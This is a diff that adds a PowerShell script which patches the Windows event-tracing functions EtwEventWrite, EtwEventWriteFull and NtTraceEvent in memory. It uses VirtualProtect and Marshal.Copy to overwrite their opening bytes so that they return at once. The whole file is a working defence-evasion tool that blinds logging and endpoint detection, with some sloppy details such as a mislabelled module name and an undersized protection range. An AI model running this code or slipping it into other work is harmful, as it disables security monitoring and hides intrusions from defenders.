@@ -1,0 +1,61 @@
+$new_class = @"
+using System;
+using System.Runtime.InteropServices;
+public class new_class {
+  [DllImport("kernel32")]
+  public static extern bool VirtualProtect(IntPtr addy, UIntPtr size, uint perm, out uint perm2);
+}
+"@
+
+Add-Type $new_class
+
+$system = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object Location -like '*System.dll'
+
+$unsafe = $system.GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+$GetModuleHandle = $unsafe.GetMethod('GetModuleHandle').Invoke($null, @("ntdll.dll"))
+Write-Host "Kernel32.dll base address: 0x$($GetModuleHandle.ToString("X"))"
+
+$GetProcAddress = $unsafe.GetMethods() | Where-Object { $_.Name -eq 'GetProcAddress' } | Select-Object -First 1
+$function_1 = $GetProcAddress.Invoke($null, @($GetModuleHandle, "EtwEventWrite"))
+$function_2 = $GetProcAddress.Invoke($null, @($GetModuleHandle, "EtwEventWriteFull"))
+$function_3 = $GetProcAddress.Invoke($null, @($GetModuleHandle, "NtTraceEvent"))
+Write-Host "EtwEventWrite address: 0x$($function_1.ToString("X"))"
+Write-Host "EtwEventWriteFull address: 0x$($function_2.ToString("X"))"
+Write-Host "NtTraceEvent address: 0x$($function_3.ToString("X"))"
+
+
+$SIZE_OF_PTR = 8
+$bytes_overwrite_memory = [byte[]] (0x0, 0x0, 0x0)
+$bytes_overwrite_memory[0] = 0x33
+$bytes_overwrite_memory[1] = 0xC0
+$bytes_overwrite_memory[2] = 0xC3
+[uint32] $dwSize = 3
+$permissions_PAGE_EXECUTE_WRITECOPY = 0x80
+$permissions_PAGE_EXECUTE_READ = 0x20
+[Int64]$ctx = 0; $p = 0; $i = 0
+
+$virtual_protect_success = [new_class]::VirtualProtect($function_1, $dwSize, $permissions_PAGE_EXECUTE_WRITECOPY, [ref]$p)
+Write-host "Adding write permissions EtwEventWrite" $virtual_protect_success
+[System.Runtime.InteropServices.Marshal]::Copy($bytes_overwrite_memory, 0, [IntPtr]$function_1, 3)
+$virtual_protect_success = [new_class]::VirtualProtect($function_1, $dwSize, $permissions_PAGE_EXECUTE_READ, [ref]$p)
+Write-host "Removing write permissions EtwEventWrite" $virtual_protect_success
+
+$virtual_protect_success = [new_class]::VirtualProtect($function_2, $dwSize, $permissions_PAGE_EXECUTE_WRITECOPY, [ref]$p)
+Write-host "Adding write permissions EtwEventWriteFull" $virtual_protect_success
+[System.Runtime.InteropServices.Marshal]::Copy($bytes_overwrite_memory, 0, [IntPtr]$function_2, 3)
+$virtual_protect_success = [new_class]::VirtualProtect($function_2, $dwSize, $permissions_PAGE_EXECUTE_READ, [ref]$p)
+Write-host "Removing write permissions EtwEventWriteFull" $virtual_protect_success
+
+$bytes_overwrite_memory_2 = [byte[]] (0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)
+$bytes_overwrite_memory_2[0] = 0x4C
+$bytes_overwrite_memory_2[1] = 0x8B
+$bytes_overwrite_memory_2[2] = 0xD1
+$bytes_overwrite_memory_2[3] = 0xB8
+$bytes_overwrite_memory_2[4] = 0xFF
+
+$virtual_protect_success = [new_class]::VirtualProtect($function_3, $dwSize, $permissions_PAGE_EXECUTE_WRITECOPY, [ref]$p)
+Write-host "Adding write permissions NtTraceEvent" $virtual_protect_success
+[System.Runtime.InteropServices.Marshal]::Copy($bytes_overwrite_memory_2, 0, [IntPtr]$function_3, 8)
+$virtual_protect_success = [new_class]::VirtualProtect($function_3, $dwSize, $permissions_PAGE_EXECUTE_READ, [ref]$p)
+Write-host "Removing write permissions NtTraceEvent" $virtual_protect_success
